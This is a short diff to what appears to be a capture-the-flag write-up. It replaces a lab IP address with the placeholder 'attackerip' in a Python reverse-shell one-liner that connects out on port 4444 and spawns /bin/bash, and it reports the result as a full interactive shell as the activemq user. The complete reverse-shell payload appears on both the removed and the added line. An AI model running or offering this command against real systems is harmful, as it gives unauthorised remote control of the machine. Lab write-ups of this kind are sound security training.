@@ -53,7 +53,7 @@ Set up a listener:
 
 Triggered a reverse shell from the pseudo-shell:
 
-**python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.14.6",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(\["/bin/bash"])'**
+**python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attackerip",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(\["/bin/bash"])'**
 
 > Result: Full interactive shell as `activemq`.
 
